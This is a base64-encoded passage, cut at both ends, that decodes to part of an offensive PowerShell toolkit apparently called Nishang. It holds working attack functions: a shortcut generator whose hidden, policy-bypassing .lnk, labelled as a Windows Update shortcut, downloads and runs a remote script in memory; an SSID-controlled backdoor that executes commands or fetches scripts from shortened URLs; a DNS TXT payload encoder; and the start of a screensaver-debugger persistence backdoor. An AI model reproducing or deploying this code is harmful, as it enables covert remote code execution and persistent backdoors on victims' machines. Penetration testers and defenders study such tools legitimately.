0aGF0IHBvd2Vyc2hlbGwuZXhlIGlzIApub3QgYSBwYXJ0IG9mIHRoZSBwYXlsb2FkIGFzIHRoZSBzaG9ydGN1dCBhbHJlYWR5IHBvaW50cyB0byBpdC4KCi5FWEFNUExFClBTID4gT3V0LVNob3J0Y3V0IC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL0dldC1XbGFuLUtleXMucHMxCgpVc2UgYWJvdmUgY29tbWFuZCB0byBnZW5lcmF0ZSBhIFNob3J0Y3V0IHdoaWNoIGRvd25sb2FkIGFuZCBleGVjdXRlIHRoZSBnaXZlbiBwb3dlcnNoZWxsIHNjcmlwdCBpbiBtZW1vcnkgb24gdGFyZ2V0LgoKLkVYQU1QTEUKUFMgPiBPdXQtU2hvcnRjdXQgLVBheWxvYWQgIi1FbmNvZGVkQ29tbWFuZCA8PiIKClVzZSBhYm92ZSBjb21tYW5kIHRvIGdlbmVyYXRlIGEgU2hvcnRjdXQgd2hpY2ggZXhlY3V0ZXMgdGhlIGdpdmVuIGVuY29kZWQgY29tbWFuZC9zY3JpcHQuClVzZSBJbnZva2UtRW5jb2RlIGZyb20gTmlzaGFuZyB0byBlbmNvZGUgdGhlIGNvbW1hbmQgb3Igc2NyaXB0LgoKCi5FWEFNUExFClBTID4gT3V0LVNob3J0Y3V0IC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL3Bvd2VycHJldGVyLnBzbTEgLUFyZ3VtZW50cyBDaGVjay1WTQoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gcGFzcyBhbiBhcmd1bWVudCB0byB0aGUgcG93ZXJzaGVsbCBzY3JpcHQvbW9kdWxlLgoKLkVYQU1QTEUKUFMgPiBPdXQtU2hvcnRjdXQgLVBheWxvYWRVUkwgaHR0cDovLzE5Mi4xNjguMjU0LjEvcG93ZXJwcmV0ZXIucHNtMSAtQXJndW1lbnRzIENoZWNrLVZNIC1Ib3RLZXkgJ0YzJwoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gYXNzaWduIEYzIGFzIGhvdGtleSB0byB0aGUgc2hvcnRjdXQKCi5FWEFNUExFClBTID4gT3V0LVNob3J0Y3V0IC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL3Bvd2VycHJldGVyLnBzbTEgLUFyZ3VtZW50cyBDaGVjay1WTSAtSG90S2V5ICdGMycgLUljb24gJ25vdGVwYWQuZXhlJwoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gYXNzaWduIG5vdGVwYWQgaWNvbiB0byB0aGUgZ2VuZXJhdGVkIHNob3J0Y3V0LgoKLkxJTksKaHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNC8xMS9wb3dlcnNoZWxsLWZvci1jbGllbnQtc2lkZS1hdHRhY2tzLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKaHR0cDovL2Jsb2cudHJlbmRtaWNyby5jb20vdHJlbmRsYWJzLXNlY3VyaXR5LWludGVsbGlnZW5jZS9ibGFjay1tYWdpYy13aW5kb3dzLXBvd2Vyc2hlbGwtdXNlZC1hZ2Fpbi1pbi1uZXctYXR0YWNrLwojPgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF5bG9hZCwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXlsb2FkVVJMLAoKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dHB1dFBhdGggPSAiJHB3ZFxTaG9ydGN1dCB0byBGaWxlIFNlcnZlci5sbmsiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRIb3RLZXkgPSAnRjUnLAoKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWNvbj0nZXhwbG9yZXIuZXhlJwoKCgoKICAgICkKICAgIGlmKCEkUGF5bG9hZCkKICAgIHsKICAgICAgICAkUGF5bG9hZCA9ICIgLVdpbmRvd1N0eWxlIGhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtbm9sb2dvIC1ub3Byb2ZpbGUgLWMgSUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnJFBheWxvYWRVUkwnKSk7JEFyZ3VtZW50cyIKICAgIH0KICAgICRXc2hTaGVsbCA9IE5ldy1PYmplY3QgLWNvbU9iamVjdCBXU2NyaXB0LlNoZWxsCiAgICAkU2hvcnRjdXQgPSAkV3NoU2hlbGwuQ3JlYXRlU2hvcnRjdXQoJE91dHB1dFBhdGgpCiAgICAkU2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUiIAogICAgJFNob3J0Y3V0LkRlc2NyaXB0aW9uID0gIlNob3J0Y3V0IHRvIFdpbmRvd3MgVXBkYXRlIENvbW1hbmRsaW5lIgogICAgJFNob3J0Y3V0LldpbmRvd1N0eWxlID0gNwogICAgJFNob3J0Y3V0LkhvdGtleSA9ICRIb3RLZXkKICAgICRTaG9ydGN1dC5JY29uTG9jYXRpb24gPSAiJEljb24sMCIKICAgICRTaG9ydGN1dC5Bcmd1bWVudHMgPSAkUGF5bG9hZAogICAgJFNob3J0Y3V0LlNhdmUoKQogICAgV3JpdGUtT3V0cHV0ICJUaGUgU2hvcnRjdXQgZmlsZSBoYXMgYmVlbiB3cml0dGVuIGFzICRPdXRwdXRQYXRoIgoKfQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRW5kIG9mIENsaWVudCBTaWRlIEF0dGFjayBmdW5jdGlvbnMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEd1cHQgQmFja2Rvb3IgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBHdXB0LUJhY2tkb29yCnsKPCMKLlNZTk9QU0lTCkd1cHQgaXMgYSBiYWNrZG9vciBpbiBOaXNoYW5nIHdoaWNoIGNvdWxkIGV4ZWN1dGUgY29tbWFuZHMgYW5kIHNjcmlwdHMgZnJvbSBzcGVjaWFsbHkgY3JhZnRlZCBXaXJlbGVzcyBOZXR3b3JrIE5hbWVzLgoKLkRFU0NSSVBUSU9OCkd1cHQgbG9va3MgZm9yIGEgc3BlY2lhbGx5IGNyYWZ0ZWQgV2lyZWxlc3MgTmV0d29yayBOYW1lL1NTSUQgZnJvbSBsaXN0IG9mIGFsbCBhdmFsaWFibGUgbmV0d29ya3MuIEl0IG1hdGNoZXMgZmlyc3QgZm91ciBjaGFyYWN0ZXJzIG9mCmVhY2ggU1NJRCB3aXRoIHRoZSBwYXJhbWV0ZXIgTWFnaWNTdHJpbmcuIE9uIGEgbWF0Y2gsIGlmIHRoZSA1dGggY2hhcmFjdGVyIGlzIGEgJ2MnLCByZXN0IG9mIHRoZSBTU0lEIG5hbWUgaXMgY29uc2lkZXJlZCB0byBiZSBhIGNvbW1hbmQgYW5kCmV4ZXVjdGVkLiBJZiB0aGUgNXRoIGNoYXJhY3RlciBpcyBhICd1JywgcmVzdCBvZiB0aGUgU1NJRCBpcyBjb25zaWRlcmVkIHRoZSBpZCBwYXJ0IG9mIEdvb2dsZSBVUkwgU2hvcnRlbmVyIGFuZCBhIHNjcmlwdCBpcyBkb3dubG9hZGVkIGFuZApleGVjdXRlZCBpbiBtZW1vcnkgZnJvbSB0aGUgVVJMLiBTZWUgZXhhbXBsZXMgZm9yIHVzYWdlLiAKCkd1cHQgZG9lcyBub3QgY29ubmVjdCB0byBhbnkgV2lyZWxlc3MgbmV0d29yayBhbmQgdGhpcyBtYWtlcyBpdCBtb3JlIHN0ZWFsdGh5IGFuZCBoZWxwcyBpbiBieXBhc3NpbmcgbmV0d29yayB0cmFmZmljIG1vbml0b3JpbmcuIAoKLlBBUkFNRVRFUiBNYWdpY1N0cmluZwpUaGUgc3RyaW5nIHdoaWNoIEd1cHQgd291bGQgY29tcGFyZSB3aXRoIHRoZSBhdmFpbGFibGUgU1NJRHMuIAoKLlBBUkFNRVRFUiBBcmd1bWVudHMKQXJndW1lbnRzIHRvIHBhc3MgdG8gYSBkb3dubG9hZGVkIHNjcmlwdC4KCi5FWEFNUExFClBTID4gR3VwdC1CYWNrZG9vciAtTWFnaWNTdHJpbmcgb3AzbiAtVmVyYm9zZQpJbiBhYm92ZSwgR3VwdCB3aWxsIGxvb2sgZm9yIGFuIFNTSUQgc3RhcnRpbmcgd2l0aCAib3AzbiIuIFRvIGV4ZWN1dGUgd2hvYW1pIG9uIHRoZSB0YXJnZXQsIHRoZSB3aXJlbGVzcyBuZXR3b3JrIG5hbWUgc2hvdWxkIGJlICJvcDNuY3dob2FtaSIuCgpQUyA+IEd1cHQtQmFja2Rvb3IgLU1hZ2ljU3RyaW5nIG9wM24gLVZlcmJvc2UKSW4gYWJvdmUsIEd1cHQgd2lsbCBsb29rIGZvciBhbiBTU0lEIHN0YXJ0aW5nIHdpdGggIm9wM24iLiBUbyBleGVjdXRlIGEgcG93ZXJzaGVsbCBzY3JpcHQgb24gdGhlIHRhcmdldCwgdGhlIHdpcmVsZXNzIG5ldHdvcmsgbmFtZSBzaG91bGQgYmUKIm9wM251bkpFdXVnIi4gSGVyZSwgR3VwdCB3aWxsIHVzZSBvZiBjaGFyYWN0ZXJzIGFmdGVyIHRoZSA1dGggb25lIGFuZCBtYWtlIHRoZSBVUkwgaHR0cDovL2dvby5nbC9uSkV1dWcuIEEgc2NyaXB0IGhvc3RlZCBhdCB0aGUgVVJMIHJlc29sdmVkCmJ5IHRoZSBHb29nbGUgc2hvcnRlbmVyIHdvdWxkIGJlIGRvd25sb2FkZWQgYW5kIGV4ZWN1dGVkLiAKCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTQvMDgvSW50cm9kdWNpbmctR3VwdC5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNYWdpY1N0cmluZywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFyZ3VtZW50cwogCiAgICApCiAgICAjR2V0IGxpc3Qgb2YgYXZhaWxhYmxlIFdsYW4gbmV0d29ya3MKICAgIHdoaWxlKCRUcnVlKQogICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkNoZWNraW5nIHdpcmVsZXNzIG5ldHdvcmtzIGZvciBpbnN0cnVjdGlvbnMuIgogICAgICAgICRuZXR3b3JrcyA9IEludm9rZS1FeHByZXNzaW9uICJuZXRzaCB3bGFuIHNob3cgbmV0d29yayIKICAgICAgICAkc3NpZCA9ICRuZXR3b3JrcyB8IFNlbGVjdC1TdHJpbmcgIlNTSUQiCiAgICAgICAgJE5ldHdvcmtOYW1lcyA9ICRzc2lkIC1yZXBsYWNlICIuKjoiIC1yZXBsYWNlICIgIgogICAgICAgIEZvckVhY2ggKCRuZXR3b3JrIGluICROZXR3b3JrTmFtZXMpCiAgICAgICAgewogICAgICAgICAgICAjQ2hlY2sgaWYgdGhlIGZpcnN0IGZvdXIgY2hhcmFjdGVycyBvZiBvdXIgU1NJRCBtYXRjaGVzIHRoZSBnaXZlbiBNYWdpY1N0cmluZwogICAgICAgICAgICBpZiAoJG5ldHdvcmsuU3Vic3RyaW5nKDAsNCkgLW1hdGNoICRNYWdpY1N0cmluZy5TdWJzdHJpbmcoMCw0KSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRm91bmQgYSBuZXR3b3JrIHdpdGggaW5zdHJ1Y3Rpb25zISIKICAgICAgICAgICAgICAgICNJZiB0aGUgbmV0b3dyayBTU0lEIGNvbnRhaW5zIGZpZnRoIGNocmFjdGVyICJ1IiwgaXQgbWVhbnMgcmVzdCBvZiB0aGUgU1NJRCBpcyBhIFVSTAogICAgICAgICAgICAgICAgaWYgKCRuZXR3b3JrLlN1YnN0cmluZyg0KVswXSAtZXEgInUiKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkRvd25sb2FkaW5nIHRoZSBhdHRhY2sgc2NyaXB0IGFuZCBleGVjdXRpbmcgaXQgaW4gbWVtb3J5LiIKICAgICAgICAgICAgICAgICAgICAkUGF5bG9hZFVSTCA9ICJodHRwOi8vZ29vLmdsLyIgKyAkbmV0d29yay5TdWJzdHJpbmcoNSkKICAgICAgICAgICAgICAgICAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoJFBheWxvYWRVUkwpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRBcmd1bWVudHMpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkQXJndW1lbnRzICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkbmV0d29yay5TdWJzdHJpbmcoNClbMF0gLWVxICJjIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkY21kID0gICRuZXR3b3JrLlN1YnN0cmluZyg1KQogICAgICAgICAgICAgICAgICAgIGlmICgkY21kIC1lcSAiZXhpdCIpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDb21tYW5kIGAiJGNtZGAiIGZvdW5kLiBFeGVjdXRpbmcgaXQuIgogICAgICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICRjbWQKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgIH0KfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNGdW5jdGlvbiBmb3IgZ2VuZXJhdGluZyBlbmNvZGVkIEROUyBUWFQgUmVjb3JkcyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBPdXQtRG5zVHh0CnsKPCMKLlNZTk9QU0lTClNjcmlwdCBmb3IgTmlzaGFuZyB0byBnZW5lcmF0ZSBETlMgVFhUIHJlY29yZHMgd2hpY2ggY291bGQgYmUgdXNlZCB3aXRoIG90aGVyIHNjcmlwdHMuIAoKLkRFU0NSSVBUSU9OClVzZSB0aGlzIHNjcmlwdCB0byBnZW5lcmF0ZSBETlMgVFhUIHJlY29yZHMgdG8gYmUgdXNlZCB3aXRoIEROU19UWFRfUHduYWdlIGFuZCBFeGVjdXRlLUROU1RYVC1Db2RlLgpUaGUgc2NyaXB0IGFza3MgZm9yIGEgcGF0aCB0byBhIHBsYWluIGZpbGUgb3Igc3RyaW5nLCBjb21wcmVzc2VzIGFuZCBlbmNvZGVzIGl0IGFuZCB3cml0ZXMgdG8gYSBmaWxlICJlbmNvZGVkdHh0LnR4dCIgaW4gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkuCkVhY2ggbGluZSBpbiB0aGUgZ2VuZXJhdGVkIGZpbGUgaXMgYSBETlMgVFhUIHJlY29yZCB0byBiZSBzYXZlZCBpbiBzZXBhcmF0ZSBzdWJiZG9tYWluLgpUaGUgbGVuZ3RoIG9mIEROUyBUWFQgcmVjb3JkcyBpcyBhc3N1bWVkIHRvIGJlIDI1NSBjaGFyYWN0ZXJzIGJ5IHRoZSBzY3JpcHQuCgouUEFSQU1FVEVSIERhdGFUb0VuY29kZQpUaGUgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkZWNvZGVkLiBVc2Ugd2l0aCAtSXNTdHJpbmcgdG8gZW50ZXIgYSBzdHJpbmcuCgouUEFSQU1FVEVSIE91dHB1dEZpbGVQYXRoClRoZSBwYXRoIG9mIHRoZSBvdXRwdXQgZmlsZS4gRGVmYXVsdCBpcyAiZW5jb2RlZHR4dC50eHQiIGluIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5LgoKLlBBUkFNRVRFUiAkTGVuZ3RoT2ZUWFQKVGhlIGxlbmd0aCBvZiB0aGUgVFhUIHJlY29yZHMuIERlZmF1bHQgaXMgMjU1LgoKLlBBUkFNRVRFUiBJc1N0cmluZwpVc2UgdGhpcyB0byBzcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGJlIGVuY29kZWQgaWYgeW91IGFyZSBwYXNzaW5nIGEgc3RyaW5nIGluIHBsYWNlIG9mIGEgZmlsZXBhdGguCgouRVhBTVBMRQpQUyA+IE9VVC1ETlNUWFQgLURhdGFUb0VuY29kZSBDOlxuaXNoYW5nXEdhdGhlclxHZXQtSW5mb3JtYXRpb24ucHMxClVzZSBhYm92ZSBjb21tYW5kIHRvIGdlbmVyYXRlIGVuY29kZWQgRE5TIFRYVCByZWNvcmRzLiBFYWNoIHJlY29yZCBtdXN0IGJlIHB1dCBpbiBhIHNlcGFyYXRlIHN1YmRvbWFpbi4KCi5FWEFNUExFClBTID4gT1VULUROU1RYVCAiR2V0LVNlcnZpY2UiIC1Jc1N0cmluZwpVc2UgYWJvdmUgdG8gZ2VuZXJhdGUgVFhUIHJlY29yZHMgZm9yIGEgY29tbWFuZC4KCgouRVhBTVBMRQpQUyA+IE9VVC1ETlNUWFQgLURhdGFUb0VuY29kZSBDOlxzaGVsbGNvZGVcc2hlbGxjb2RlLnR4dApVc2UgYWJvdmUgY29tbWFuZCB0byBnZW5lcmF0ZSBlbmNvZGVkIEROUyBUWFQgcmVjb3JkcyBmb3IgYSBzaGVsbGNvZGUuIEVhY2ggcmVjb3JkIG11c3QgYmUgcHV0IGluIGEgc2VwYXJhdGUgc3ViZG9tYWluLgoKLkxJTksKaHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNS8wMS9mdW4td2l0aC1kbnMtdHh0LXJlY29yZHMtYW5kLXBvd2Vyc2hlbGwuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGF0YVRvRW5jb2RlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRGaWxlUGF0aCA9ICIkcHdkXGVuY29kZWR0eHQudHh0IiwgCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMZW5ndGhPZlRYVCA9IDI1NSwgCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJElzU3RyaW5nCiAgICApCiAgICBpZigkSXNTdHJpbmcgLWVxICR0cnVlKQogICAgewogICAgCiAgICAgICAkRW5jID0gJERhdGFUb0VuY29kZQogICAgICAgCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJEVuYyA9IEdldC1Db250ZW50ICREYXRhVG9FbmNvZGUgLUVuY29kaW5nIEFzY2lpCiAgICB9CiAgICAKICAgICNDb21wcmVzc2lvbiBsb2dpYyBmcm9tIGh0dHA6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMTMvMy8yMS9wb3dlcnNoZWxsLWJhc2ljcy1leGVjdXRpb24tcG9saWN5LWFuZC1jb2RlLXNpZ25pbmctcGFydC0yLmh0bWwKICAgICRtcyA9IE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtCiAgICAkYWN0aW9uID0gW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzCiAgICAkY3MgPSBOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCRtcywkYWN0aW9uKQogICAgJHN3ID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIgKCRjcywgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkKICAgICRFbmMgfCBGb3JFYWNoLU9iamVjdCB7JHN3LldyaXRlTGluZSgkXyl9CiAgICAkc3cuQ2xvc2UoKQogICAgIyBCYXNlNjQgZW5jb2RlIHN0cmVhbQogICAgJENvbXByZXNzZWQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRtcy5Ub0FycmF5KCkpCiAgICAkaW5kZXggPSBbbWF0aF06OmZsb29yKCRDb21wcmVzc2VkLkxlbmd0aC8kTGVuZ3RoT2ZUWFQpCiAgICAkaSA9IDAKICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkbnVsbCAtRmlsZVBhdGggJE91dHB1dEZpbGVQYXRoCiAgICAjU3BsaXQgZW5jb2RlZCBpbnB1dCBpbiBzdHJpbmdzIG9mIDI1NSBjaGFyYWN0ZXJzIGlmIGl0cyBsZW5ndGggaXMgbW9yZSB0aGFuIDI1NS4KICAgIGlmICgkQ29tcHJlc3NlZC5MZW5ndGggLWd0ICRMZW5ndGhPZlRYVCkKICAgIHsKICAgICAgICB3aGlsZSAoJGkgLWx0ICRpbmRleCApCiAgICAgICAgewogICAgICAgICAgICAkVFhUUmVjb3JkID0gJENvbXByZXNzZWQuU3Vic3RyaW5nKCRpKiRMZW5ndGhPZlRYVCwkTGVuZ3RoT2ZUWFQpCiAgICAgICAgICAgICRpICs9MQogICAgICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJFRYVFJlY29yZCAtRmlsZVBhdGggJE91dHB1dEZpbGVQYXRoIC1BcHBlbmQKICAgICAgICAgICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICJgbmBuYG4iIC1GaWxlUGF0aCAkT3V0cHV0RmlsZVBhdGggLUFwcGVuZAogICAgICAgIH0KICAgICAgICAkcmVtYWluaW5naW5kZXggPSAkQ29tcHJlc3NlZC5MZW5ndGglJExlbmd0aE9mVFhUCiAgICAgICAgaWYgKCRyZW1haW5pbmdpbmRleCAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRUWFRSZWNvcmQgPSAkQ29tcHJlc3NlZC5TdWJzdHJpbmcoJGluZGV4KiRMZW5ndGhPZlRYVCwgJHJlbWFpbmluZ2luZGV4KQogICAgICAgICAgICAkVG90YWxSZWNvcmRzID0gJGluZGV4ICsgMQogICAgICAgIH0KICAgICAgICAjV3JpdGUgdG8gZmlsZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkVFhUUmVjb3JkIC1GaWxlUGF0aCAkT3V0cHV0RmlsZVBhdGggLUFwcGVuZAogICAgICAgIFdyaXRlLU91dHB1dCAiWW91IG5lZWQgdG8gY3JlYXRlICRUb3RhbFJlY29yZHMgVFhUIHJlY29yZHMuIgogICAgICAgIFdyaXRlLU91dHB1dCAiQWxsIFRYVCBSZWNvcmRzIHdyaXR0ZW4gdG8gJE91dHB1dEZpbGVQYXRoIgogICAgfQogICAgI0lmIHRoZSBpbnB1dCBoYXMgc21hbGwgbGVuZ3RoLCBpdCBjb3VsZCBiZSB1c2VkIGluIGEgc2luZ2xlIHN1YmRvbWFpbi4KICAgIGVsc2UKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlRYVCBSZWNvcmQgY291bGQgZml0IGluIHNpbmdsZSBzdWJkb21haW4uIgogICAgICAgIFdyaXRlLU91dHB1dCAkQ29tcHJlc3NlZAogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkQ29tcHJlc3NlZCAtRmlsZVBhdGggJE91dHB1dEZpbGVQYXRoIC1BcHBlbmQKICAgICAgICBXcml0ZS1PdXRwdXQgIlRYVCBSZWNvcmRzIHdyaXR0ZW4gdG8gJE91dHB1dEZpbGVQYXRoIgogICAgfQoKCn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI0Z1bmN0aW9uIGZvciBhZGRpbmcgc2NyZWVuc2F2ZXIgYmFja2Rvb3IjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIEFkZC1TY3JuU2F2ZUJhY2tkb29yCnsKPCMKLlNZTk9QU0lTCk5pc2hhbmcgU2NyaXB0IHdoaWNoIGNvdWxkIHNldCBEZWJ1Z2dlciByZWdpc3RyeSBrZXlzIGZvciBhIHNjcmVlbnNhdmVyIHRvIHJlbW90ZWx5IGV4ZWN1dGUgY29tbWFuZHMgYW5kIHNjcmlwdHMuIAoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgcmVhZHMgdGhlIHZhbHVlIG9mIFdpbmRvd3MgcmVnaXN0cnkga2V5IEhLRVlfQ1VSUkVOVF9VU0VSXENvbnRyb2wgUGFuZWxcRGVza3RvcFxTQ1JOU0FWRS5FWEUgCnRvIGNoZWNrIGZvciB0aGUgZXhpc3RpbmcgU2NyZWVuc2F2ZXIuIElmIG5vbmUgZXhpc3RzLCBvbmUgZnJvbSB0aGUgZGVmYXVsdCBvbmVzIHdoaWNoIGV4aXN0IGluIEM6XFdpbmRvd3NcU3lzdGVtMzIgaXMgdXNlZC4KQSBEZWJ1Z2dlciB0byB0aGUgc2NyZWVuc2F2ZXIgaXMgY3JlYXRlZCBhdCBIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9uc1wuIApJdCBpcyB0aGUgdmFsdWUgb2YgdGhlICJEZWJ1Z2dlciIgdG8gdGhpcyBrZXkgd2hlcmUgaXQgd3JpdGVzIHRoZSBwYXlsb2FkLiBBIHNjcmVlbnNhdmVyIHNlbGVjdGVkIGZyb20gdGhlIGRlZmF1bHQgb25lcyBpcyBhZGRlZCB0byB0aGlzIHBheWxvYWQuCgpXaGVuIHRoZSBwYXlsb2FkIGlzIGV4ZWN1dGVkLCB0aGUgc2NyZWVuc2F2ZXIgYWxzbyBydW5zIGFmdGVyIGl0IHRvIG1ha2UgaXQgYXBwZWFyIGxlZ2l0LiBDaGFuZ2UgdGhlIGNvbnRlbnRzIG9mIHRoZSBwYXlsb2FkIFVSTAp0byBleGVjdXRlIGRpZmZlcmVudCBzY3JpcHRzIHVzaW5nIHRoZSBzYW1lIGJhY2tkb29yLgoKLlBBUkFNRVRFUiBQYXlsb2FkClBheWxvYWQgd2hpY2ggeW91IHdhbnQgZXhlY3V0ZSBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBQYXlsb2FkVVJMClVSTCBvZiB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgd2hpY2ggd291bGQgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgQXJndW1lbnRzCkFyZ3VtZW50cyB0byB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgdG8gYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgTmV3U2NyZWVuU2F2ZXIKRnVsbCBwYXRoIHRvIHRoZSBzY3JlZW5zYXZlciB0byBiZSB1c2VkIGlmIG5vbmUgaXMgYmVpbmcg